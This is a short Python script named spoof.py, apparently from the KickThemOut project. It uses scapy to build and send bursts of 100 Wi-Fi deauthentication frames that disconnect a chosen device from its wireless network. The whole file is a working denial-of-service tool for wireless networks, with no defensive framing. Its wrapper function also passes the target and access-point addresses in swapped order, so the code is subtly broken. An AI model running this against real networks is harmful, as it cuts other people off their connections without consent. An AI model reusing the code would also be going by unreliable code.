#!/usr/bin/env python3
# -.- coding: utf-8 -.-
# spoof.py

"""
Copyright (C) 2017-18 Nikolaos Kamarinakis (nikolaskam@gmail.com) & David Schütz (xdavid@protonmail.com)
See License at nikolaskama.me (https://nikolaskama.me/kickthemoutproject)
"""

import sys, logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import (
    sendp,
    RadioTap,
    Dot11,
    Dot11Deauth
)

# send deauthentication packets
def sendDeauthPacket(iface, src_mac, target_mac, bssid):
    radio = RadioTap()
    dot11 = Dot11(type=0, subtype=12, addr1=target_mac, addr2=src_mac, addr3=bssid)
    deauth = Dot11Deauth(reason=7)
    packet = radio / dot11 / deauth
    sendp(packet, iface=iface, count=100, inter=0.1)

# Function to send packets, updated to match required parameters
def sendPacket(iface, src_mac, bssid, target_mac):
    try:
        sendDeauthPacket(iface, src_mac, bssid, target_mac)
    except OSError as e:
        if e.errno == 19:  # No such device
            print(f"Error: The network interface '{iface}' does not exist. Please check the interface name and try again.")
        else:
            raise
